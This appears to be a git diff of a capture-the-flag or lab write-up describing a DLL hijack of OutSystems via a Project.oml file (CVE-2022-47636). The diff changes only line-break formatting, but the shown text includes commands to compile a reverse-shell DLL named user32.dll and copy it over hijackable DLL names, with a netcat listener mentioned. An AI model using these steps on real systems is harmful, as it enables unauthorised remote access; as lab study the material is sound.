@@ -18,8 +18,8 @@ Disable windows autologin for security reasons
 He mentions some sort of Project that he works on, and that someone checks this every minute. From further manual enumeration I find a file called Project.oml in `\shared`.
 
 ### CVE-2022-47636
-Searching for exploits in .oml files shows a dll hijack exploit identified in 2022
-![Google results from cve2022-47636](./assets/cve2022-47636.png)
+Searching for exploits in .oml files shows a dll hijack exploit identified in 2022\
+![Google results from cve2022-47636](./assets/cve2022-47636.png)\
 From reading about the exploit on [exploitdb](https://www.exploit-db.com/exploits/51678), it seems fairly trivial to exploit
 ```
 A DLL hijacking vulnerability has been discovered in OutSystems Service 
@@ -40,7 +40,7 @@ With the local ip and port added to the payload and netcat listener running, I c
 ```
 x86_64-w64-mingw32-gcc reverse_dll.c -shared -lws2_32 -o user32.dll
 ```
-![Uploaded user32 to target](./assets/user32.png)
+![Uploaded user32 to target](./assets/user32.png)\
 Since I was not sure if all of the DLLs were loaded by project.oml, I also copied the file to the other DLLs listed in the exploit details on [exploitdb](https://www.exploit-db.com/exploits/51678).
 ```
 Copy-Item "user32.dll" -Destination 'av_libGLESv2.dll'
